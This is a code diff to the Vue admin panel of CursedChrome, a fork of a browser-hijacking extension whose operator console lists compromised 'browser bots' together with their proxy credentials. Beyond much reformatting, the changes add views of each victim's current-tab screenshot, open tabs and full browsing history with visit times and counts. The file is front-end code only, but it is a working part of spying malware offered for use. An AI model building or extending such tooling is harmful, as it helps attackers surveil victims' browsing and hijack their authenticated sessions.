@@ -2,7 +2,7 @@
     <div>
         <!-- Loading bar -->
         <div class="fixed-bottom" v-if="loading">
-          <b-progress :value="100" variant="success" striped :animated="true"></b-progress>
+            <b-progress :value="100" variant="success" striped :animated="true"></b-progress>
         </div>
         <!-- Navbar, only displayed when logged in -->
         <div v-if="user.is_authenticated">
@@ -12,27 +12,31 @@
                 <b-collapse id="nav-collapse" is-nav>
                     <b-navbar-nav>
                         <b-nav-item target="_blank" href="https://github.com/s045pd/CursedChrome">
-                            <font-awesome-icon :icon="['fab', 'github']" class="icon alt mr-1 ml-1"></font-awesome-icon> Repo
+                            <font-awesome-icon :icon="['fab', 'github']" class="icon alt mr-1 ml-1"></font-awesome-icon>
+                            Repo
                         </b-nav-item>
                     </b-navbar-nav>
                     <b-navbar-nav class="ml-auto">
                         <b-nav-item>
-                             <font-awesome-icon :icon="['fas', 'user']" class="icon alt mr-1 ml-1"></font-awesome-icon>
-                              Logged in as: <b>{{user.username}}</b> 
+                            <font-awesome-icon :icon="['fas', 'user']" class="icon alt mr-1 ml-1"></font-awesome-icon>
+                            Logged in as: <b>{{ user.username }}</b>
                         </b-nav-item>
                         <b-nav-item v-on:click="logout">
-                            Sign Out <font-awesome-icon :icon="['fas', 'sign-out-alt']" class="icon alt mr-1 ml-1"></font-awesome-icon>
+                            Sign Out <font-awesome-icon :icon="['fas', 'sign-out-alt']"
+                                class="icon alt mr-1 ml-1"></font-awesome-icon>
                         </b-nav-item>
                     </b-navbar-nav>
                 </b-collapse>
             </b-navbar>
             <b-alert variant="warning" class="text-center" show v-if="user.password_should_be_changed">
                 <p>
-                    <font-awesome-icon :icon="['fas', 'exclamation-triangle']" class="icon alt mr-1 ml-1"></font-awesome-icon>
+                    <font-awesome-icon :icon="['fas', 'exclamation-triangle']"
+                        class="icon alt mr-1 ml-1"></font-awesome-icon>
                     You are currently using a system-generated password, please update your account password.
                 </p>
                 <b-button variant="primary" v-on:click="show_update_password_modal">
-                    <font-awesome-icon :icon="['fas', 'edit']" class="icon alt mr-1 ml-1"></font-awesome-icon> Update Password
+                    <font-awesome-icon :icon="['fas', 'edit']" class="icon alt mr-1 ml-1"></font-awesome-icon> Update
+                    Password
                 </b-button>
             </b-alert>
         </div>
@@ -47,14 +51,17 @@
                             Admin Panel
                         </h1>
                         <b-alert show>
-                            <font-awesome-icon :icon="['fas', 'info-circle']" class="icon alt mr-1 ml-1"></font-awesome-icon> <i>If this is your first time logging in, please use the credentials printed to your console when you first set the service up.</i>
+                            <font-awesome-icon :icon="['fas', 'info-circle']"
+                                class="icon alt mr-1 ml-1"></font-awesome-icon> <i>If this is your first time logging in,
+                                please use the credentials printed to your console when you first set the service up.</i>
                         </b-alert>
                     </div>
                     <div class="input-group mb-2" style="width: 100%">
                         <div class="input-group-prepend">
                             <span class="input-group-text" style="min-width: 100px;">Username</span>
                         </div>
-                        <input type="text" class="form-control" placeholder="admin" v-model="user.login.username" autofocus />
+                        <input type="text" class="form-control" placeholder="admin" v-model="user.login.username"
+                            autofocus />
                     </div>
                     <div class="input-group mb-3" style="width: 100%">
                         <div class="input-group-prepend">
@@ -63,7 +70,8 @@
                         <input type="password" class="form-control" placeholder="********" v-model="user.login.password" />
                     </div>
                     <button class="btn btn-lg btn-primary btn-block" v-on:click="log_in">
-                        <font-awesome-icon :icon="['fas', 'sign-in-alt']" class="icon alt mr-1 ml-1"></font-awesome-icon> Sign in
+                        <font-awesome-icon :icon="['fas', 'sign-in-alt']" class="icon alt mr-1 ml-1"></font-awesome-icon>
+                        Sign in
                     </button>
                 </div>
             </div>
@@ -71,7 +79,8 @@
             <div v-if="user.is_authenticated">
                 <!-- Bots panel -->
                 <b-card-group deck>
-                    <b-card border-variant="primary" header="CursedChrome Bots" header-bg-variant="primary" header-text-variant="white" align="center">
+                    <b-card border-variant="primary" header="CursedChrome Bots" header-bg-variant="primary"
+                        header-text-variant="white" align="center">
                         <b-card-text>
                             <h1>Connected Browser Bot(s)</h1>
                             <table class="table table-striped">
@@ -81,7 +90,7 @@
                                         <th scope="col">Name</th>
                                         <th scope="col">HTTP Proxy Credentials</th>
                                         <th scope="col">Online?</th>
-                                        <th scope="col">Tabs</th>
+                                        <th scope="col">Tabs/History</th>
                                         <th scope="col">CurrentTab</th>
                                         <th scope="col">Options</th>
                                     </tr>
@@ -89,57 +98,75 @@
                                 <tbody>
                                     <tr v-for="bot in bots" v-bind:key="bot.id">
                                         <td scope="row" style="vertical-align: middle;">
-                                             <img :src="bot.current_tab_image" alt="Image" width="160" height="90" />
+                                            <b-img :src="bot.current_tab_image" alt="Image" width="160" height="90" fluid></b-img>
                                         </td>
                                         <td scope="row" style="vertical-align: middle;">
-                                            {{bot.name}}
+                                            {{ bot.name }}
                                         </td>
                                         <td style="vertical-align: middle;">
                                             <div>
                                                 <div class="input-group" style="width: 100%">
                                                     <div class="input-group-prepend">
-                                                        <span class="input-group-text" style="min-width: 100px;">Username</span>
+                                                        <span class="input-group-text"
+                                                            style="min-width: 100px;">Username</span>
                                                     </div>
-                                                    <input type="text" class="form-control" placeholder="Please wait..." v-bind:value="bot.proxy_username">
+                                                    <input type="text" class="form-control" placeholder="Please wait..."
+                                                        v-bind:value="bot.proxy_username">
                                                     <div class="input-group-append">
-                                                        <span class="input-group-text copy-element" v-bind:data-clipboard-text="bot.proxy_username" v-on:click="copy_toast">
-                                                            <font-awesome-icon :icon="['fas', 'clipboard']" class="icon alt mr-1 ml-1" /></span>
+                                                        <span class="input-group-text copy-element"
+                                                            v-bind:data-clipboard-text="bot.proxy_username"
+                                                            v-on:click="copy_toast">
+                                                            <font-awesome-icon :icon="['fas', 'clipboard']"
+                                                                class="icon alt mr-1 ml-1" /></span>
                                                     </div>
                                                 </div>
                                                 <div class="input-group" style="width: 100%">
                                                     <div class="input-group-prepend">
-                                                        <span class="input-group-text" style="min-width: 100px;">Password</span>
+                                                        <span class="input-group-text"
+                                                            style="min-width: 100px;">Password</span>
                                                     </div>
-                                                    <input type="text" class="form-control" placeholder="Please wait..." v-bind:value="bot.proxy_password">
-                                                    <div class="input-group-append copy-element" v-bind:data-clipboard-text="bot.proxy_password" v-on:click="copy_toast">
+                                                    <input type="text" class="form-control" placeholder="Please wait..."
+                                                        v-bind:value="bot.proxy_password">
+                                                    <div class="input-group-append copy-element"
+                                                        v-bind:data-clipboard-text="bot.proxy_password"
+                                                        v-on:click="copy_toast">
                                                         <span class="input-group-text">
-                                                            <font-awesome-icon :icon="['fas', 'clipboard']" class="icon alt mr-1 ml-1" /></span>
+                                                            <font-awesome-icon :icon="['fas', 'clipboard']"
+                                                                class="icon alt mr-1 ml-1" /></span>
                                                     </div>
                                                 </div>
                                             </div>
                                         </td>
-                                        <td class="table-success online-col" style="vertical-align: middle;" v-if="bot.is_online">
+                                        <td class="table-success online-col" style="vertical-align: middle;"
+                                            v-if="bot.is_online">
                                             <span class="online-symbol">
-                                                <font-awesome-icon :icon="['fas', 'check-circle']" class="icon alt mr-1 ml-1" />
+                                                <font-awesome-icon :icon="['fas', 'check-circle']"
+                                                    class="icon alt mr-1 ml-1" />
                                             </span>
                                         </td>
-                                        <td class="online-col table-danger p-0" style="vertical-align: middle;" v-if="!bot.is_online">
+                                        <td class="online-col table-danger p-0" style="vertical-align: middle;"
+                                            v-if="!bot.is_online">
                                             <span class="offline-symbol">
-                                                <font-awesome-icon :icon="['fas', 'times-circle']" class="icon alt mr-1 ml-1" />
+                                                <font-awesome-icon :icon="['fas', 'times-circle']"
+                                                    class="icon alt mr-1 ml-1" />
                                             </span>
                                         </td>
-                                        <td></td>
                                         <td>
-                                            <button><a :href="bot.current_tab.url" target=”_blank”>{{ bot.current_tab.title }} </a></button>
+                                            {{ bot.tabs.length }} / {{ bot.history.length }}
                                         </td>
-                                        
+                                        <td>
+                                            <b-link  :href="bot.current_tab.url" target=”_blank”>{{ bot.current_tab.title}} </b-link>
+                                        </td>
+
                                         <td style="vertical-align: middle;">
                                             <b-button-group vertical>
                                                 <b-button variant="primary" v-on:click="bot_open_options(bot.id)">
-                                                    <font-awesome-icon :icon="['fas', 'cog']" class="icon alt mr-1 ml-1" /> Options
+                                                    <font-awesome-icon :icon="['fas', 'cog']" class="icon alt mr-1 ml-1" />
+                                                    Options
                                                 </b-button>
                                                 <b-button variant="danger" v-on:click="delete_bot(bot.id)">
-                                                    <font-awesome-icon :icon="['fas', 'trash']" class="icon alt mr-1 ml-1" /> Delete
+                                                    <font-awesome-icon :icon="['fas', 'trash']"
+                                                        class="icon alt mr-1 ml-1" /> Delete
                                                 </b-button>
                                             </b-button-group>
                                         </td>
@@ -151,29 +178,64 @@
                 </b-card-group>
                 <!-- Options panel -->
                 <b-card-group deck class="mt-4">
-                    <b-card border-variant="info" header="Options" header-bg-variant="info" header-text-variant="white" align="center">
+                    <b-card border-variant="info" header="Options" header-bg-variant="info" header-text-variant="white"
+                        align="center">
                         <b-card-text>
                             <b-button variant="info" v-on:click="download_ca">
-                                <font-awesome-icon :icon="['fas', 'download']" class="icon alt mr-1 ml-1" /> Download HTTPS Proxy CA Certificate <i>(Required to Use HTTP Proxy)</i>
+                                <font-awesome-icon :icon="['fas', 'download']" class="icon alt mr-1 ml-1" /> Download HTTPS
+                                Proxy CA Certificate <i>(Required to Use HTTP Proxy)</i>
                             </b-button>
                         </b-card-text>
                     </b-card>
                 </b-card-group>
                 <!-- Bot options modal -->
-                <div v-if="options_selected_bot">
-                    <b-modal id="bot_options_modal" title="Bot Options & Info" ok-only ok-variant="secondary" ok-title="Close">
-                        <p>
-                            This bot has a User-Agent of <code>{{ options_selected_bot.user_agent }}</code> and was first seen {{ options_selected_bot.createdAt | moment("MMMM Do YYYY, h:mm:ss a") }}.
+                <div v-if="id_bot_selected">
+                    <b-modal id="bot_options_modal" title="Bot Options & Info" ok-only ok-variant="secondary"
+                        ok-title="Close" size="xl">
+                         <p v-if="bots_map[id_bot_selected].current_tab">
+                            <a :href="bots_map[id_bot_selected].current_tab.url" target=”_blank”>{{ bots_map[id_bot_selected].current_tab.title }} </a>
                         </p>
                         <p>
-                            Bot UUID is <code>{{options_selected_bot.id}}</code>
+                            <b-img-lazy center thumbnail fluid :src="bots_map[id_bot_selected].current_tab_image" width="800"
+                                height="450"></b-img-lazy>
+                        </p>
+                        <p>
+                            This bot has a User-Agent of <code>{{ bots_map[id_bot_selected].user_agent }}</code> and was first
+                            seen {{ bots_map[id_bot_selected].createdAt | moment("MMMM Do YYYY, h:mm:ss a") }}.
+                        </p>
+                       
+                        <p>
+                            Bot UUID is <code>{{ bots_map[id_bot_selected].id }}</code>
+                        </p>
+                        <p>
+                            <b-button-group>
+                                <b-button variant="success" v-b-toggle.sidebar-tab>Tabs</b-button>
+                                <b-button variant="warning" v-b-toggle.sidebar-left>History</b-button>
+                            </b-button-group>
+                            <b-sidebar id="sidebar-tab" title="Tabs" right shadow width="500">
+                                <b-list-group>
+                                    <b-list-group-item v-for="tab in bots_map[id_bot_selected].tabs" v-bind:key="tab.id">
+                                         <b-link :href="tab.url"> <b-avatar :src="tab.favIconUrl"></b-avatar> {{ tab.title }}</b-link>
+                                    </b-list-group-item>
+                                </b-list-group>
+                            </b-sidebar>
+                            <b-sidebar id="sidebar-left" title="History" left shadow width="500">
+                                <b-list-group>
+                                    <b-list-group-item v-for="history in bots_map[id_bot_selected].history" v-bind:key="history.id">
+                                        <p>{{ calc_date(history.lastVisitTime) }}</p>
+                                        <p><span> <b-badge href="#" variant="primary">{{ history.visitCount }}</b-badge></span>&nbsp;<b-link :href="history.url">{{ history.title }}</b-link></p>
+                                        
+                                    </b-list-group-item>
+                                </b-list-group>
+                            </b-sidebar>
                         </p>
                         <hr />
                         <div class="input-group">
                             <div class="input-group-prepend">
                                 <span class="input-group-text">Bot Name</span>
                             </div>
-                            <input type="text" class="form-control" placeholder="Please wait..." v-model="options_selected_bot.name" autofocus>
+                            <input type="text" class="form-control" placeholder="Please wait..."
+                                v-model="options_selected_bot.name" autofocus>
                             <b-button variant="primary" v-on:click="update_bot_name">
                                 <font-awesome-icon :icon="['fas', 'edit']" class="icon alt mr-1 ml-1" /> Rename
                             </b-button>
@@ -182,7 +244,8 @@
                 </div>
                 <!-- Update user password modal -->
                 <div>
-                    <b-modal id="update_password_modal" title="Update Account Password" ok-only ok-variant="secondary" ok-title="Never mind">
+                    <b-modal id="update_password_modal" title="Update Account Password" ok-only ok-variant="secondary"
+                        ok-title="Never mind">
                         <p>
                             Enter your new password below
                         </p>
@@ -190,18 +253,22 @@
                             <div class="input-group-prepend">
                                 <span class="input-group-text">New Password</span>
                             </div>
-                            <input type="password" class="form-control" placeholder="******" v-model="update_password.new_password" autofocus>
+                            <input type="password" class="form-control" placeholder="******"
+                                v-model="update_password.new_password" autofocus>
                         </div>
                         <div class="input-group mb-2">
                             <div class="input-group-prepend">
                                 <span class="input-group-text">New Password (Again)</span>
                             </div>
-                            <input type="password" class="form-control" placeholder="******" v-model="update_password.new_password_again" autofocus>
+                            <input type="password" class="form-control" placeholder="******"
+                                v-model="update_password.new_password_again" autofocus>
                         </div>
                         <b-alert class="text-center" show variant="danger" v-if="!change_passwords_match">
-                          <font-awesome-icon :icon="['fas', 'exclamation-circle']" class="icon alt mr-1 ml-1" /> Both passwords do not match, double check your inputs.
+                            <font-awesome-icon :icon="['fas', 'exclamation-circle']" class="icon alt mr-1 ml-1" /> Both
+                            passwords do not match, double check your inputs.
                         </b-alert>
-                        <b-button variant="primary btn-block" v-bind:disabled="!change_passwords_match" v-on:click="update_user_password">
+                        <b-button variant="primary btn-block" v-bind:disabled="!change_passwords_match"
+                            v-on:click="update_user_password">
                             <font-awesome-icon :icon="['fas', 'key']" class="icon alt mr-1 ml-1" /> Change Password
                         </b-button>
                     </b-modal>
@@ -218,8 +285,8 @@ export default {
         window.app = this;
         return {
             update_password: {
-              new_password: '',
-              new_password_again: '',
+                new_password: '',
+                new_password_again: '',
             },
             user: {
                 is_authenticated: false,
@@ -232,13 +299,15 @@ export default {
             },
             loading: false,
             bots: [],
+            bots_map: {},
             options_selected_bot: {},
+            id_bot_selected: null
         }
     },
     computed: {
-      change_passwords_match() {
-        return this.update_password.new_password === this.update_password.new_password_again;
-      }
+        change_passwords_match() {
+            return this.update_password.new_password === this.update_password.new_password_again;
+        }
     },
     methods: {
         async update_user_password() {
@@ -246,7 +315,7 @@ export default {
                 'PUT',
                 '/password',
                 {
-                  new_password: this.update_password.new_password
+                    new_password: this.update_password.new_password
                 }
             );
             this.user.password_should_be_changed = false;
@@ -279,9 +348,9 @@ export default {
                 var login_result = await api_request(
                     'POST',
                     '/login', {
-                        'username': this.user.login.username,
-                        'password': this.user.login.password,
-                    }
+                    'username': this.user.login.username,
+                    'password': this.user.login.password,
+                }
                 );
             } catch (e) {
                 console.error(`Invalid login.`);
@@ -301,9 +370,9 @@ export default {
             await api_request(
                 'PUT',
                 '/bots', {
-                    'bot_id': this.options_selected_bot.id,
-                    'name': this.options_selected_bot.name
-                }
+                'bot_id': this.options_selected_bot.id,
+                'name': this.options_selected_bot.name
+            }
             );
             this.$toastr.s('Bot renamed successfully.');
             this.refresh_bots();
@@ -312,13 +381,14 @@ export default {
             await api_request(
                 'DELETE',
                 '/bots', {
-                    'bot_id': bot_id
-                }
+                'bot_id': bot_id
+            }
             );
             this.$toastr.s('Bot deleted successfully.');
             this.refresh_bots();
         },
         bot_open_options(bot_id) {
+            this.id_bot_selected = bot_id
             this.options_selected_bot = copy(this.get_selected_bot(bot_id));
             this.$nextTick(() => {
                 this.$bvModal.show('bot_options_modal');
@@ -331,6 +401,9 @@ export default {
                 false
             );
             this.bots = response.bots;
+            response.bots.map(bot => {
+                this.bots_map[bot.id] = bot;
+            });
         },
         download_ca() {
             window.location = `${BASE_API_PATH}/download_ca`;
@@ -348,6 +421,18 @@ export default {
             });
             return matching_bot[0];
         },
+        calc_date(timestamp){
+            const date = new Date(timestamp);
+            const year = date.getFullYear();
+            const month = (date.getMonth() + 1).toString().padStart(2, '0');
+            const day = date.getDate().toString().padStart(2, '0');
+            const hours = date.getHours().toString().padStart(2, '0');
+            const minutes = date.getMinutes().toString().padStart(2, '0');
+            const seconds = date.getSeconds().toString().padStart(2, '0');
+            const formattedDateTime = `${year}年${month}月${day}号 ${hours}:${minutes}:${seconds}`;
+            return formattedDateTime;
+
+        },
         async logout() {
             await api_request(
                 'GET',
@@ -359,7 +444,7 @@ export default {
         },
     },
     // Run on page load
-    mounted: async function() {
+    mounted: async function () {
         new ClipboardJS('.copy-element'); // eslint-disable-line
 
         // Update auth status
@@ -402,13 +487,13 @@ async function api_request(method, path, body) {
     window.app.loading = true;
 
     try {
-      var response = await fetch(
-          `${BASE_API_PATH}${path}`,
-          request_options
-      );
-    } catch ( e ) {
-      window.app.loading = false;
-      throw e;
+        var response = await fetch(
+            `${BASE_API_PATH}${path}`,
+            request_options
+        );
+    } catch (e) {
+        window.app.loading = false;
+        throw e;
     }
     window.app.loading = false;
 
@@ -425,8 +510,7 @@ async function api_request(method, path, body) {
 }
 </script>
 <!-- Add "scoped" attribute to limit CSS to this component only -->
-<style scoped>
-.online-col {
+<style scoped>.online-col {
     width: 20px;
     text-align: center;
 }
@@ -456,5 +540,4 @@ async function api_request(method, path, body) {
 
 .navbar-dark .navbar-nav .nav-link {
     color: rgba(255, 255, 255, 1);
-}
-</style>
+}</style>
